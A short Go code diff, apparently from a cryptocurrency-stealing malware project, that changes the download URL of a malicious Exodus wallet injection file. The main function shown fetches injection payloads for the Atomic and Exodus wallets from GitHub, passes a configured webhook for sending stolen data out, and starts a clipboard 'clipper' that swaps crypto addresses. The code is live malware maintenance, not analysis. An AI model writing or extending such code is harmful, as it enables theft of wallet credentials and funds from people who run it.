@@ -63,7 +63,7 @@ func main() {
 	)
 	go walletsinjection.Run(
 		"https://github.com/opiumsoftware/wallets-injection/raw/main/atomic.asar",
-		"https://github.com/hackirby/wallets-injection/raw/main/exodus.asar",
+		"https://github.com/opiumsoftware/wallets-injection/raw/main/exodus.asar",
 		CONFIG["webhook"].(string),
 	)
 
@@ -83,5 +83,6 @@ func main() {
 
 	clipper.Run(CONFIG["cryptos"].(map[string]string))
 }
+
 
 
